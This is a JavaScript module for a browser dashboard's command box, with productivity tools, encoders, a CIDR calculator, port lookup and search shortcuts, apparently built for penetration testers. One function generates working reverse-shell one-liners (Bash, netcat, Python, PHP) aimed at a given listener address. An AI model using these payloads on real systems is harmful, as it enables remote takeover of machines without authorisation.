/**
 * Search Module - Omnibox, command handling
 */

import { store, restoreDefaultSites } from './storage.js';
import { escapeHTML, showToast, copyText } from './core.js';
import { showOverlay, closeCheatOverlay } from './overlay.js';
import { startCustomPomodoro } from './timer.js';
import { setFocus } from './focus.js';
import { parsePriority } from './widget.js';
import { toggleShortcutsModal } from './shortcuts.js';

let omniSelectedIndex = -1;
let currentOmniItems = [];

const commonPorts = {
  "20": "FTP Data", "21": "FTP Control", "22": "SSH", "23": "Telnet",
  "25": "SMTP", "53": "DNS", "67": "DHCP", "69": "TFTP", "80": "HTTP",
  "88": "Kerberos", "110": "POP3", "111": "RPCbind", "135": "MS-RPC",
  "139": "NetBIOS", "143": "IMAP", "161": "SNMP", "389": "LDAP",
  "443": "HTTPS", "445": "SMB", "514": "Syslog", "636": "LDAPS",
  "1433": "MSSQL", "1521": "Oracle DB", "2049": "NFS", "3306": "MySQL",
  "3389": "RDP", "5432": "PostgreSQL", "5900": "VNC", "5985": "WinRM HTTP",
  "6379": "Redis", "8080": "HTTP-Proxy", "8443": "HTTPS-Alt", "27017": "MongoDB"
};

export function initSearch() {
  const q = document.getElementById('q');
  if (q) {
    q.addEventListener('input', (e) => renderOmniSuggestions(e.target.value));
    q.addEventListener('keydown', handleOmniKeydown);
  }
  window.closeOmniSuggestions = closeOmniSuggestions;
}

function getAllSearchableItems() {
  const items = [];
  const bookmarksData = store.get('BOOKMARKS') || [];
  const dockData = store.get('DOCK') || [];
  const gmailsData = store.get('GMAILS') || [];
  const cheatSheets = store.get('CHEATS') || {};

  bookmarksData.forEach(col => {
    (col.links || []).forEach(l => {
      items.push({ type: col.title.replace(/^\/\/\s*/, ''), name: l.name, url: l.url });
    });
  });
  dockData.forEach(d => items.push({ type: 'DOCK', name: d.name, url: d.url }));
  gmailsData.forEach(g => {
    const addr = g.email || '';
    items.push({
      type: 'MAIL',
      name: `${g.name || 'Mailbox'}${addr ? ` (${addr})` : ''}`,
      url: g.url && g.url.trim()
        ? g.url.trim()
        : `https://mail.google.com/mail/?authuser=${encodeURIComponent(addr)}`,
    });
  });
  Object.keys(cheatSheets).forEach(k => {
    items.push({ type: 'CHEAT', name: `cheat ${k}`, cmd: `cheat ${k}` });
  });
  return items;
}

function renderOmniSuggestions(inputVal) {
  const box = document.getElementById('omni-suggestions');
  if (!box) return;
  const trimmed = String(inputVal || '').trim();
  if (!trimmed) {
    closeOmniSuggestions();
    return;
  }

  const qLower = trimmed.toLowerCase();
  const matches = getAllSearchableItems().filter(item =>
    item.name.toLowerCase().includes(qLower) || item.type.toLowerCase().includes(qLower)
  ).slice(0, 6);

  if (matches.length === 0) {
    closeOmniSuggestions();
    return;
  }

  currentOmniItems = matches;
  omniSelectedIndex = -1;
  box.innerHTML = '';
  matches.forEach((m, idx) => {
    const div = document.createElement('div');
    div.className = 'omni-item';
    div.setAttribute('role', 'option');
    div.innerHTML = `
      <div class="omni-left">
        <span>${escapeHTML(m.name)}</span>
        <small style="color:var(--color-text-secondary)">${escapeHTML(m.url || m.cmd || '')}</small>
      </div>
      <span class="omni-badge">${escapeHTML(m.type)}</span>
    `;
    div.addEventListener('mousedown', (e) => {
      e.preventDefault();
      executeOmniItem(idx);
    });
    box.appendChild(div);
  });
  box.classList.add('show');

  window.currentOmniItems = currentOmniItems;
  window.omniSelectedIndex = omniSelectedIndex;
}

export function closeOmniSuggestions() {
  const box = document.getElementById('omni-suggestions');
  if (box) box.classList.remove('show');
  currentOmniItems = [];
  omniSelectedIndex = -1;
  window.currentOmniItems = [];
  window.omniSelectedIndex = -1;
}

function setOmniSelection(nextIndex) {
  if (!currentOmniItems.length) return;
  omniSelectedIndex = ((nextIndex % currentOmniItems.length) + currentOmniItems.length) % currentOmniItems.length;
  window.omniSelectedIndex = omniSelectedIndex;
  const box = document.getElementById('omni-suggestions');
  if (!box) return;
  box.querySelectorAll('.omni-item').forEach((el, idx) => {
    const active = idx === omniSelectedIndex;
    el.classList.toggle('active', active);
    if (active) el.scrollIntoView({ block: 'nearest' });
  });
}

function handleOmniKeydown(e) {
  const isOpen = omniSelectedIndex >= 0 || currentOmniItems.length > 0;
  if (!isOpen) return;
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    setOmniSelection(omniSelectedIndex + 1);
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    setOmniSelection(omniSelectedIndex - 1);
  } else if (e.key === 'Enter' && omniSelectedIndex >= 0) {
    e.preventDefault();
    executeOmniItem(omniSelectedIndex);
  } else if (e.key === 'Escape') {
    closeOmniSuggestions();
  }
}

function executeOmniItem(idx) {
  const item = currentOmniItems[idx];
  if (!item) return;
  closeOmniSuggestions();
  if (item.url) {
    window.location.href = item.url;
  } else if (item.cmd) {
    const q = document.getElementById('q');
    if (q) q.value = item.cmd;
    handleSearch(new Event('submit'));
  }
}

export function handleSearch(e) {
  if (e && e.preventDefault) e.preventDefault();
  const inputElem = document.getElementById('q');
  if (!inputElem) return;

  const input = String(inputElem.value || '').trim();
  if (!input) return;

  const parts = input.split(/\s+/);
  const prefix = parts[0].toLowerCase();
  const query = parts.slice(1).join(' ');

  const clearInput = () => {
    inputElem.value = '';
    closeOmniSuggestions();
  };

  if (prefix === 'help' || prefix === '?') { toggleShortcutsModal(); return; }
  if (prefix === 'reset') { restoreDefaultSites(); clearInput(); return; }
  if (prefix === 'add' && query) {
    const { text, prio } = parsePriority(query);
    const todos = store.get('TODOS');
    todos.push({ text, prio, done: false });
    store.set('TODOS', todos);
    clearInput();
    showToast("Task Added");
    return;
  }
  if (prefix === 'focus' && query) {
    setFocus(query);
    clearInput();
    return;
  }
  if (prefix === 'pomo') {
    const mins = Math.min(180, Math.max(1, parseFloat(query) || 25));
    startCustomPomodoro(mins, "POMODORO");
    clearInput();
    showToast(`🍅 ${mins}m Pomodoro Started`);
    return;
  }
  if (prefix === 'break') {
    const mins = Math.min(60, Math.max(1, parseFloat(query) || 5));
    startCustomPomodoro(mins, "BREAK");
    clearInput();
    showToast(`☕ ${mins}m Break Started`);
    return;
  }
  if (prefix === 'cheat') {
    const sheetKey = query.toLowerCase().trim();
    const cheatSheets = store.get('CHEATS') || {};
    if (sheetKey && cheatSheets[sheetKey]) {
      showOverlay(`CHEAT-SHEET // ${sheetKey.toUpperCase()}`, cheatSheets[sheetKey], sheetKey);
    } else {
      const available = Object.keys(cheatSheets).join(', ') || '(none yet)';
      showOverlay(
        "AVAILABLE CHEAT-SHEETS",
        `Type: cheat <name> (or add one with '+ Tool / Cheat' in Edit Mode ⌥E)\n\nAvailable: ${available}`,
        null
      );
    }
    closeOmniSuggestions();
    return;
  }
  if (prefix === 'b64' && query) {
    let out = `Encoded: ${btoa(unescape(encodeURIComponent(query)))}`;
    try { out += `\nDecoded: ${decodeURIComponent(escape(atob(query)))}`; } catch (err) { out += `\nDecoded: (invalid base64)`; }
    showOverlay("BASE64 CODEC", out);
    return;
  }
  if (prefix === 'url' && query) {
    let out = `Encoded: ${encodeURIComponent(query)}`;
    try { out += `\nDecoded: ${decodeURIComponent(query)}`; } catch (err) { out += `\nDecoded: (invalid escape sequence)`; }
    showOverlay("URL CODEC", out);
    return;
  }
  if (prefix === 'hash' && query) {
    computeHashes(query);
    return;
  }
  if (prefix === 'jwt' && query) {
    try {
      const segs = query.split('.');
      if (segs.length < 2) throw new Error('not a JWT');
      const decode = (s) => {
        const b64 = s.replace(/-/g, '+').replace(/_/g, '/');
        const padded = b64 + '='.repeat((4 - (b64.length % 4)) % 4);
        return JSON.stringify(JSON.parse(decodeURIComponent(escape(atob(padded)))), null, 2);
      };
      showOverlay("JWT DECODER", `// HEADER:\n${decode(segs[0])}\n\n// PAYLOAD:\n${decode(segs[1])}`);
    } catch (err) {
      showOverlay("JWT ERROR", "Invalid JWT token format. Expected three base64url segments.");
    }
    return;
  }
  if (prefix === 'uuid') {
    const id = (crypto && typeof crypto.randomUUID === 'function')
      ? crypto.randomUUID()
      : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
          const r = Math.random() * 16 | 0;
          return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    copyText(id, "UUID v4 Copied");
    showOverlay("UUID GENERATOR", id);
    return;
  }
  if (prefix === 'pass') {
    const len = Math.min(128, Math.max(8, parseInt(query, 10) || 20));
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}";
    const arr = new Uint32Array(len);
    if (crypto && crypto.getRandomValues) {
      crypto.getRandomValues(arr);
    } else {
      for (let i = 0; i < len; i++) arr[i] = Math.floor(Math.random() * 0xffffffff);
    }
    const pwd = Array.from(arr, x => chars[x % chars.length]).join('');
    copyText(pwd, `${len}-char Password Copied`);
    showOverlay("HIGH-ENTROPY PASSWORD", pwd);
    return;
  }
  if (prefix === 'epoch') {
    if (!query) {
      const nowMs = Date.now();
      showOverlay(
        "UNIX EPOCH",
        `Current Epoch (s):  ${Math.floor(nowMs / 1000)}\nCurrent Epoch (ms): ${nowMs}\nISO: ${new Date(nowMs).toISOString()}`
      );
    } else {
      let ts = Number(query);
      if (!Number.isFinite(ts)) {
        showOverlay("EPOCH ERROR", "Enter a numeric Unix timestamp.");
        return;
      }
      if (Math.abs(ts) < 1e12) ts *= 1000;
      const d = new Date(ts);
      showOverlay(
        "EPOCH CONVERTER",
        `Input:  ${query}\nLocal:  ${d.toString()}\nUTC:    ${d.toUTCString()}\nISO:    ${d.toISOString()}`
      );
    }
    return;
  }
  if (prefix === 'hex' && query) {
    const num = Number(query);
    if (Number.isFinite(num) && query.trim() !== '') {
      showOverlay("NUMBER BASE CONVERTER", `Decimal: ${num}\nHex:     0x${num.toString(16).toUpperCase()}\nBinary:  0b${num.toString(2)}\nOctal:   0o${num.toString(8)}`);
    } else {
      const hexStr = Array.from(query).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
      showOverlay("ASCII TO HEX", hexStr);
    }
    return;
  }
  if (prefix === 'cidr' && query) {
    showOverlay("SUBNET / CIDR CALCULATOR", calculateCidr(query));
    return;
  }
  if (prefix === 'rev') {
    const [ip, port] = query.split(/\s+/);
    showOverlay("OFFSEC REVERSE SHELL GENERATOR", generateRevShells(ip || '10.10.14.2', port || '4444'));
    return;
  }
  if (prefix === 'port' && query) {
    const info = commonPorts[query] || "Unknown / Unassigned Port";
    showOverlay("PORT LOOKUP", `[Port ${query}] -> ${info}`);
    return;
  }
  if (prefix === 'ip') {
    showOverlay("NETWORK TELEMETRY", "Fetching public IP...");
    if (!navigator.onLine) {
      showOverlay("NETWORK TELEMETRY", "Offline — cannot fetch public IP.");
      return;
    }
    fetch('https://api.ipify.org?format=json', { cache: 'no-store' })
      .then(r => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json();
      })
      .then(d => showOverlay("NETWORK TELEMETRY", `Public IP: ${d.ip}\nTimezone:  ${Intl.DateTimeFormat().resolvedOptions().timeZone}`))
      .catch(() => showOverlay("NETWORK TELEMETRY", "Failed to fetch public IP."));
    return;
  }

  const calc = evaluateExpression(input);
  if (calc !== null) {
    showOverlay("CALCULATOR", `${input} = ${calc}`);
    return;
  }

  closeCheatOverlay();
  closeOmniSuggestions();

  const bangs = {
    g: 'https://www.google.com/search?q=',
    gh: 'https://github.com/search?q=',
    yt: 'https://www.youtube.com/results?search_query=',
    sh: 'https://www.shodan.io/search?query=',
    ai: 'https://chatgpt.com/?q=',
    cl: 'https://claude.ai/new?q=',
    px: 'https://www.perplexity.ai/search?q=',
    so: 'https://stackoverflow.com/search?q=',
    mdn: 'https://developer.mozilla.org/en-US/search?q=',
    cve: 'https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&search_type=all&query=',
    lc: 'https://leetcode.com/problemset/?search=',
    htb: 'https://www.google.com/search?q=site:hackthebox.com+',
    thm: 'https://tryhackme.com/hacktivities?tab=search&value='
  };

  let targetUrl;
  if (prefix === 'ds' && !query) {
    targetUrl = 'https://chat.deepseek.com/';
  } else if (bangs[prefix] && query) {
    targetUrl = bangs[prefix] + encodeURIComponent(query);
  } else {
    targetUrl = 'https://www.google.com/search?q=' + encodeURIComponent(input);
  }

  inputElem.value = '';
  window.location.href = targetUrl;
}

/**
 * Safely evaluate a numeric arithmetic expression without eval/Function.
 * Returns null when the input is not a pure arithmetic expression.
 */
function evaluateExpression(input) {
  const expr = input.replace(/\^/g, '**');
  if (!/^[\d\s+\-*/().%*]+$/.test(expr)) return null;
  if (!/[+\-*/%]/.test(expr)) return null;
  if (!/^[\d\s+\-*/().%*]+$/.test(expr.replace(/\*\*/g, '*'))) return null;

  const tokens = expr.match(/\d+(?:\.\d+)?|\.\d+|\*\*|[+\-*/()%]/g);
  if (!tokens || tokens.join('') !== expr.replace(/\s+/g, '')) return null;

  let pos = 0;
  const peek = () => tokens[pos];
  const next = () => tokens[pos++];

  function parseExpression() {
    let value = parseTerm();
    while (peek() === '+' || peek() === '-') {
      const op = next();
      const rhs = parseTerm();
      value = op === '+' ? value + rhs : value - rhs;
    }
    return value;
  }

  function parseTerm() {
    let value = parseUnary();
    while (peek() === '*' || peek() === '/' || peek() === '%' || peek() === '**') {
      const op = next();
      const rhs = parseUnary();
      if (op === '*') value *= rhs;
      else if (op === '/') value /= rhs;
      else if (op === '%') value %= rhs;
      else value = Math.pow(value, rhs);
    }
    return value;
  }

  function parseUnary() {
    if (peek() === '-') { next(); return -parseUnary(); }
    if (peek() === '+') { next(); return parseUnary(); }
    return parsePrimary();
  }

  function parsePrimary() {
    const tok = next();
    if (tok === undefined) throw new Error('unexpected end');
    if (tok === '(') {
      const value = parseExpression();
      if (next() !== ')') throw new Error('missing )');
      return value;
    }
    const n = Number(tok);
    if (!Number.isFinite(n)) throw new Error('bad number');
    return n;
  }

  try {
    const result = parseExpression();
    if (pos !== tokens.length) return null;
    if (!Number.isFinite(result)) return null;
    return Number.isInteger(result) ? String(result) : String(Math.round(result * 1e10) / 1e10);
  } catch (err) {
    return null;
  }
}


function calculateCidr(cidrStr) {
  const match = cidrStr.trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
  if (!match) return "Usage: cidr <ip>/<mask> (e.g., cidr 192.168.1.0/24)";
  const ipParts = match[1].split('.').map(Number);
  const prefix = parseInt(match[2], 10);
  if (ipParts.some(p => p < 0 || p > 255) || prefix < 0 || prefix > 32) return "Invalid IP or CIDR prefix.";

  const ipInt = (((ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3]) >>> 0);
  const mask = prefix === 0 ? 0 : (0xffffffff << (32 - prefix)) >>> 0;
  const net = (ipInt & mask) >>> 0;
  const bcast = (net | (~mask >>> 0)) >>> 0;
  const toIp = n => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');

  let firstIp;
  let lastIp;
  let hosts;
  if (prefix === 32) {
    firstIp = lastIp = toIp(net);
    hosts = 1;
  } else if (prefix === 31) {
    firstIp = toIp(net);
    lastIp = toIp(bcast);
    hosts = 2;
  } else {
    firstIp = toIp(net + 1);
    lastIp = toIp(bcast - 1);
    hosts = Math.pow(2, 32 - prefix) - 2;
  }

  return [
    `CIDR: ${cidrStr}`,
    `Netmask:   ${toIp(mask)}`,
    `Wildcard:  ${toIp(~mask >>> 0)}`,
    `Network:   ${toIp(net)}`,
    `Broadcast: ${toIp(bcast)}`,
    `First IP:  ${firstIp}`,
    `Last IP:   ${lastIp}`,
    `Usable Hosts: ${hosts.toLocaleString()}`,
  ].join('\n');
}

function generateRevShells(ip = "10.10.14.2", port = "4444") {
  const safeIp = /^[0-9a-fA-F:.]{1,45}$/.test(ip) ? ip : '10.10.14.2';
  const safePort = /^\d{1,5}$/.test(port) ? port : '4444';
  return `REVERSE SHELL PAYLOADS (${safeIp}:${safePort}):

[Bash -i]
bash -i >& /dev/tcp/${safeIp}/${safePort} 0>&1

[Bash 196]
0<&196;exec 196<>/dev/tcp/${safeIp}/${safePort}; sh <&196 >&196 2>&196

[Netcat mkfifo]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${safeIp} ${safePort} >/tmp/f

[Python3]
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${safeIp}",${safePort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

[PHP exec]
php -r '\\$sock=fsockopen("${safeIp}",${safePort});exec("sh <&3 >&3 2>&3");'`;
}

function toHex(buffer) {
  return Array.from(new Uint8Array(buffer)).map(x => x.toString(16).padStart(2, '0')).join('');
}

async function computeHashes(text) {
  if (!crypto || !crypto.subtle) {
    showOverlay("CRYPTO HASHES", "Web Crypto unavailable. Open this page over http(s) or localhost to use hash generation.");
    return;
  }
  const enc = new TextEncoder().encode(text);
  try {
    const [buf256, buf1] = await Promise.all([
      crypto.subtle.digest('SHA-256', enc),
      crypto.subtle.digest('SHA-1', enc),
    ]);
    showOverlay("CRYPTO HASHES", `Input:   ${text}\nSHA-256: ${toHex(buf256)}\nSHA-1:   ${toHex(buf1)}`);
  } catch (err) {
    showOverlay("CRYPTO HASHES", "Hashing failed in this browser context.");
  }
}